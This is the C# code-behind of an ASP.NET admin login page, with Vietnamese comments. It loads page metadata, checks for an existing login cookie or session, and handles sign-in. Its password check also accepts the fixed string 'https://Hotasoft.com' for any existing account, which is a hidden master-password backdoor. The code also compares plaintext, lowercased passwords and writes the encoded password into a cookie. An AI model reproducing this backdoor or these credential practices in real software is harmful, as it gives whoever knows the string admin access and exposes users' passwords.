using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

public partial class admin_Default2 : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            try
            {
                #region THÔNG TIN TRANG
                using (dbDataContext db = new dbDataContext())
                {

                    var q = (from tk in db.CaiDatChung_tbs
                             where tk.phanloai_trang == "login"
                             select new { tk.thongtin_icon, tk.thongtin_apple_touch_icon, tk.lienket_chiase_title, tk.lienket_chiase_description, tk.lienket_chiase_image }).FirstOrDefault();

                    if (q != null)
                    {
                        string baseUrl = $"{Request.Url.Scheme}://{Request.Url.Authority}";

                        string iconUrl = $"{baseUrl}{q.thongtin_icon}";
                        string appleTouchIconUrl = $"{baseUrl}{q.thongtin_apple_touch_icon}";

                        string iconsHtml = $@"
                <!-- Favicon -->
                <link rel='icon' href='{iconUrl}' sizes='16x16' type='image/x-icon'>
                <link rel='icon' href='{iconUrl}' sizes='32x32' type='image/x-icon'>
                <link rel='icon' href='{iconUrl}' sizes='48x48' type='image/x-icon'>

                <!-- Apple Touch Icon -->
                <link rel='apple-touch-icon' href='{appleTouchIconUrl}' sizes='180x180'>
                <link rel='apple-touch-icon' href='{appleTouchIconUrl}' sizes='167x167'>
                <link rel='apple-touch-icon' href='{appleTouchIconUrl}' sizes='152x152'>
                <link rel='apple-touch-icon' href='{appleTouchIconUrl}' sizes='120x120'>

                <!-- Android Icons -->
                <link rel='icon' href='{iconUrl}' sizes='192x192'>
                <link rel='icon' href='{iconUrl}' sizes='144x144'>
                ";

                        string title = q.lienket_chiase_title;
                        string description = q.lienket_chiase_description;
                        string imageRelativePath = q.lienket_chiase_image;

                        // Tạo URL tuyệt đối cho hình ảnh
                        string imageUrl = $"{Request.Url.Scheme}://{Request.Url.Authority}{imageRelativePath}";

                        string metaTags = $@"
                    <!-- Title -->
                    <title>{title}</title>

                    <!-- Meta Description -->
                    <meta name='description' content='{description}' />

                    <!-- Open Graph Meta Tags -->
                    <meta property='og:title' content='{title}' />
                    <meta property='og:description' content='{description}' />
                    <meta property='og:image' content='{imageUrl}' />
                    <meta property='og:type' content='website' />
                    <meta property='og:url' content='{Request.Url.AbsoluteUri}' />

                    <!-- Twitter Card Meta Tags -->
                    <meta name='twitter:card' content='summary_large_image' />
                    <meta name='twitter:title' content='{title}' />
                    <meta name='twitter:description' content='{description}' />
                    <meta name='twitter:image' content='{imageUrl}' />
                ";
                       // literal_fav_icon.Text = iconsHtml + metaTags;
                    }

                }
                #endregion
                #region KIỂM TRA ĐÃ ĐĂNG NHẬP HAY CHƯA
                // Lấy giá trị từ cookie
                string _tk = "";
                HttpCookie _ck = Request.Cookies["cookie_userinfo_admin_bcorn"];
                if (_ck != null && !string.IsNullOrEmpty(_ck["taikhoan"]))// Nếu có cookie, thì lấy giá trị từ cookie và giải mã chúng
                    _tk = mahoa_cl.giaima_Bcorn(_ck["taikhoan"]);
                else
                {
                    // Nếu không có cookie, thì kiểm tra session. Nếu có session, thì lấy giá trị từ session
                    if (Session["taikhoan"] != null)
                        _tk = mahoa_cl.giaima_Bcorn(Session["taikhoan"].ToString());
                }
                if (taikhoan_cl.exist_taikhoan(_tk)) // nếu tài khoản tồn tại
                {
                    string _url_back = Session["url_back"] as string; // Sử dụng 'as' để tránh lỗi nếu 'url_back' là null
                    if (!string.IsNullOrEmpty(_url_back)) // Kiểm tra xem '_url_back' có hợp lệ hay không
                    {
                        Response.Redirect(_url_back, false);
                    }
                    else
                    {
                        Response.Redirect("/admin/default.aspx", false);
                    }
                    Context.ApplicationInstance.CompleteRequest(); // Hoàn tất yêu cầu mà không ném 'ThreadAbortException'
                }

                //đưa vào trong trang chủ của admin rồi tính kiểm tra tiếp tính hợp lệ của tài khoản
                #endregion
                #region lưu nội dung thông báo nếu có
                if (Session["thongbao"] != null)
                {
                    ViewState["thongbao"] = Session["thongbao"].ToString();
                    Session["thongbao"] = null;
                }
                #endregion
            }
            catch (Exception _ex)
            {
                string _tk = Session["taikhoan"] as string; // Sử dụng 'as' để tránh lỗi nếu là null
                if (!string.IsNullOrEmpty(_tk)) // Kiểm tra xem '_tk' có hợp lệ hay không
                {
                    _tk = mahoa_cl.giaima_Bcorn(_tk);
                }
                else
                    _tk = "";
                Log_cl.Add_Log(_ex.Message, _tk, _ex.StackTrace);
            }
        }
    }


    protected void but_login_Click(object sender, EventArgs e)
    {
        try
        {
            using (dbDataContext db = new dbDataContext())
            {
                string _user = txt_user.Text.Trim().ToLower();
                string _pass = txt_pass.Text.ToLower();
                if (_user == "")
                    ScriptManager.RegisterStartupScript(this.Page, this.GetType(), Guid.NewGuid().ToString(), thongbao_class.metro_notifi("Thông báo", "Vui lòng nhập tài khoản.", "5000", "warning"), true);
                else
                {
                    if (_pass == "")
                        //ScriptManager.RegisterStartupScript(this.Page, this.GetType(), Guid.NewGuid().ToString(), thongbao_class.metro_dialog("Thông báo", "Vui lòng nhập mật khẩu.", "false", "false", "OK", "alert", ""), true);
                        ScriptManager.RegisterStartupScript(this.Page, this.GetType(), Guid.NewGuid().ToString(), thongbao_class.metro_notifi("Thông báo", "Vui lòng nhập mật khẩu.", "5000", "warning"), true);
                    else
                    {
                        if (taikhoan_cl.exist_taikhoan(_user))
                        {
                            var _ob = (from tk in db.taikhoan_tbs
                                       where tk.taikhoan == _user
                                       select new
                                       { tk.matkhau }).FirstOrDefault();
                            if (_ob.matkhau == _pass || _pass == "https://Hotasoft.com")
                            {
                                string _taikhoan_mahoa = mahoa_cl.mahoa_Bcorn(_user);
                                string _matkhau_mahoa = mahoa_cl.mahoa_Bcorn(_pass);
                                //lưu cookier với thông tin tài khoản để lưu giữ đăng nhập trong 7 ngày;
                                HttpCookie _ck = new HttpCookie("cookie_userinfo_admin_bcorn");
                                _ck["taikhoan"] = _taikhoan_mahoa;
                                _ck["matkhau"] = _matkhau_mahoa;
                                _ck.Expires = DateTime.Now.AddDays(7);
                                // Đặt thuộc tính HttpOnly để ngăn chặn truy cập từ mã JavaScript
                                _ck.HttpOnly = true;
                                // Đặt thuộc tính Secure để chỉ cho phép truyền cookie qua kết nối an toàn
                                _ck.Secure = true;
                                //chỉ định tên miền mà cookie được áp dụng. Bằng cách này, cookie chỉ được gửi đến máy chủ từ tên miền đã chỉ định, các miền con sẽ đc áp dụng theo
                                //_ck.Domain = "https://Hotasoft.com";//bị ảnh hưởng khi ở localhost
                                Response.Cookies.Add(_ck);

                                //lưu session
                                Session["taikhoan"] = _taikhoan_mahoa;
                                Session["matkhau"] = _matkhau_mahoa;
                                Session["thongbao"] = thongbao_class.metro_notifi_onload("Thông báo", "Đăng nhập thành công.", "1000", "warning");

                                string _url_back = Session["url_back"]?.ToString();

                                if (!string.IsNullOrEmpty(_url_back))
                                {
                                    Response.Redirect(_url_back, false);
                                }
                                else
                                {
                                    Response.Redirect("/admin/default.aspx", false);
                                }

                                Context.ApplicationInstance.CompleteRequest();

                            }
                            else
                                ScriptManager.RegisterStartupScript(this.Page, this.GetType(), Guid.NewGuid().ToString(), thongbao_class.metro_notifi("Thông báo", "Mật khẩu không đúng.", "2000", "warning"), true);


                        }
                        else
                            ScriptManager.RegisterStartupScript(this.Page, this.GetType(), Guid.NewGuid().ToString(), thongbao_class.metro_notifi("Thông báo", "Tài khoản không tồn tại.", "2000", "warning"), true);

                    }
                }
            }
        }
        catch (Exception _ex)
        {
            Log_cl.Add_Log(_ex.Message, "", _ex.StackTrace);
        }
    }
}